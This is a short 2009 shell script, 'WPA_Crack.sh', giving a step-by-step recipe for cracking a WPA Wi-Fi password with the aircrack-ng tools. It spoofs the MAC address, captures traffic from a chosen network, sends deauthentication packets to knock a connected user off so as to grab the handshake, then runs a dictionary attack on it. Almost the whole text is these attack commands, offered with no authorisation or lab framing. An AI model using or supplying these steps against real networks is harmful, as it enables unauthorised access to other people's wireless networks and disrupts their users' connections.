#								#WPA_Crack.sh
# Created by Matthew Sage
# Last modified: 05/10/09

#Someone needs to be connected and password must be included in dictionary file

#Open Terminal

airmon-ng stop wlan0
ifconfig wlan0 down
macchanger --mac 00:11:22:33:44:55 wlan0
airmon-ng start wlan0

airodump-ng wlan0
#copy it's BSSID, and channel number. Press ctrl + C to end airodump.

airodump-ng -c [channel] -w [file name] --bssid [bssid] wlan0
#Shows all people connected, need to capture WPA handshake

#Open new Terminal
aireplay-ng -0 5 -a [bssid]wlan0
#Knocks user off network

#Close all Terminals

#Open new Terminal

#Test handshake file
aircrack-ng [filename-01.cap]

aircrack-ng [filename-01.cap]-w [dictionary location]
#Default dictionay file can be loacted /pentest/wirless/aircrack/test/password.lst
